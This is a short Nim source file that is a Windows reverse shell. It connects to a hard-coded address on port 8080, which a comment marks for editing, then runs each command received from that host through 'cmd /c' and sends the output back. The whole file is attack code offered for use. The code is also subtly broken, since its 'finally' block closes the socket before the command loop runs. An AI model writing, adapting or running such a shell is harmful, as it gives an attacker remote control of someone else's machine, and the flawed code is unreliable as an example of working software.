import net, osproc

var
    LHOST = "10.50.2.119" # edit here
    LPORT = Port(8080) # Define port method as nim language requires
    sock = newSocket()

try:
    sock.connect(LHOST, LPORT)
except:
    raise
finally:
    sock.close

while true:
    let cmd = sock.recvLine()
    if cmd == "exit":
        break
    let result = execProcess("cmd /c " & cmd)
    sock.send(result)
